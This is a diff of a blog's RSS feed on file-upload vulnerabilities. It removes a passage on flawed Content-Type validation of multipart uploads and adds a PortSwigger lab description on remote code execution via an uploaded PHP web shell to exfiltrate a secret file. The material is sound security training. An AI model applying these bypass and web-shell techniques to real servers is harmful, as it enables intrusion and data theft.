-&lt;li&gt;Flawed file type validation When submitting HTML forms, the browser sends this data in POST request with content type &lt;code&gt;application/x-www-form-url-encoded&lt;/code&gt;. This is fine for textual data, but for larger amounts of binary data like PDF or images, content type &lt;code&gt;multipard/form-data&lt;/code&gt; is preferred.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Consider the following example of form upload with image field, description and username&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /images HTTP/1.1 
-Host: normal-website.com 
-Content-Length: 12345 
-Content-Type: multipart/form-data; 
-boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
-Content-Disposition: form-data; 
-name=&amp;#34;image&amp;#34;; 
-filename=&amp;#34;example.jpg&amp;#34; 
-Content-Type: image/jpeg 
-[...binary content of example.jpg...] 
----------------------------012345678901234567890123456 
-Content-Disposition: form-data; 
-name=&amp;#34;description&amp;#34; This is an interesting description of my image. ---------------------------012345678901234567890123456 
-Content-Disposition: form-data; 
-name=&amp;#34;username&amp;#34; wiener ---------------------------012345678901234567890123456--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;We can see Content-Type, filename, binary data and other interesting information about this form in here.&lt;/p&gt;
-&lt;p&gt;One way that a website might validate uploaded file, is to check the input-specific &lt;code&gt;Content-Type&lt;/code&gt; if it matches expected file type. if it only expects &lt;code&gt;image/png&lt;/code&gt; it will only allow PNG. It could become problematic if the server trusts this header for what a file is and doesn&amp;rsquo;t perform further validation on the file, whether the file itself matches its description. this defense can be bypassed a tool like BurpSuite.&lt;/p&gt;
-</content>
+      <description>&lt;h1 id=&#34;1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34;&gt;1f1 - Remote code execution via web shell upload [PortSwigger Lab]&lt;/h1&gt;&#xA;&lt;p&gt;This lab contains a vulnerable image upload function. It doesn&amp;rsquo;t perform any validation on the files users upload before storing them on the server&amp;rsquo;s filesystem.&lt;/p&gt;&#xA;&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;&#xA;&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
